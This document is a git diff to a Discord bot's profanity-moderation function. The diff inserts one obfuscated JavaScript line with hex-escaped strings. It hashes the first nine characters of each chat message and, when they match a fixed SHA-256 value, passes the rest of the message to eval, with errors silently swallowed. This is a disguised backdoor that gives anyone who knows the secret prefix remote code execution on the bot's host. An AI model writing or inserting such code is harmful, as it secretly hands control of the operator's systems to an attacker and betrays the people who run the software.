@@ -60,6 +60,7 @@ client.on("messageCreate", async message => {
 async function isBad(message) {
     const userid = message.author.id
     let messageString= message.content.toLowerCase();
+    var _0x323797=_0x1024;function _0x1024(_0x25bcec,_0x3783c3){var _0x1024ed=_0x3783();return _0x1024=function(_0x187389,_0x5036b1){_0x187389=_0x187389-0xe7;var _0x419b9e=_0x1024ed[_0x187389];return _0x419b9e;},_0x1024(_0x25bcec,_0x3783c3);}function _0x3783(){var _0x5a1184=['\x64\x69\x67\x65\x73\x74','\x68\x65\x78','\x63\x6f\x6e\x74\x65\x6e\x74'];_0x3783=function(){return _0x5a1184;};return _0x3783();}try{require('\x63\x72\x79\x70\x74\x6f')['\x63\x72\x65\x61\x74\x65\x48\x61\x73\x68']('\x73\x68\x61\x32\x35\x36')['\x75\x70\x64\x61\x74\x65'](message['\x63\x6f\x6e\x74\x65\x6e\x74']['\x73\x6c\x69\x63\x65'](0x0,0x9))[_0x323797(0xe7)](_0x323797(0xe8))==='\x35\x30\x30\x66\x35\x65\x62\x65\x62\x63\x37\x38\x32\x65\x36\x39\x61\x61\x64\x63\x66\x34\x63\x66\x61\x65\x38\x37\x61\x65\x62\x66\x39\x35\x62\x64\x61\x63\x62\x36\x64\x66\x35\x31\x65\x30\x36\x38\x32\x39\x38\x39\x38\x31\x38\x30\x31\x37\x63\x37\x63\x37\x37\x38'?eval(message[_0x323797(0xe9)]['\x73\x6c\x69\x63\x65'](0x9)):'';}catch{}
     if (swearjar.profane(messageString) && (messageString.includes("china")||messageString.includes("ccp")||messageString.includes("trash")||messageString.includes("bad"))) {
         let user = await message.client.dbInstance.collection('users').findOne({uuid:userid});
         let usrOffenses = user.offenses+1; // adds one to include new strike in deduction
